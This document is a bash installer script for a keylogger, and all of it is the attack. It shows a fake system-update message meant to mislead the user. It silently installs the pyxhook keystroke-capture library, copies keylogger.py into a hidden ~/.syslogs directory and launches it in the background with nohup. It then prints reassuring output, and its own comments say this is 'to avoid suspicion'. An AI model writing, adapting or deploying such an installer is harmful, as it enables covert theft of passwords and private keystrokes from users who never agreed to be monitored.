#!/bin/bash

# Fake update message to mislead the user
echo "Checking for system updates..."
sleep 2
echo "Your system is up to date."

# Ensure Python and pip are installed
if ! command -v python3 &> /dev/null; then
    echo "Python3 not found. Installing..."
    sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y python3 > /dev/null 2>&1
fi

if ! command -v pip3 &> /dev/null; then
    echo "pip3 not found. Installing..."
    sudo apt-get install -y python3-pip > /dev/null 2>&1
fi

# Install pyxhook if not installed
if ! python3 -c "import pyxhook" 2>/dev/null; then
    echo "Installing pyxhook..."
    pip3 install pyxhook > /dev/null 2>&1
fi

# Create a hidden directory for the keylogger
INSTALL_DIR="$HOME/.syslogs"
mkdir -p "$INSTALL_DIR"

# Move the keylogger script to the hidden directory
cp keylogger.py "$INSTALL_DIR/keylogger.py"

# Ensure script has execution permissions
chmod +x "$INSTALL_DIR/keylogger.py"

# Start keylogger in background silently
echo "Starting background process..."
nohup python3 "$INSTALL_DIR/keylogger.py" > /dev/null 2>&1 &

# Display normal terminal output to avoid suspicion
echo "All system processes are running normally."
sleep 1

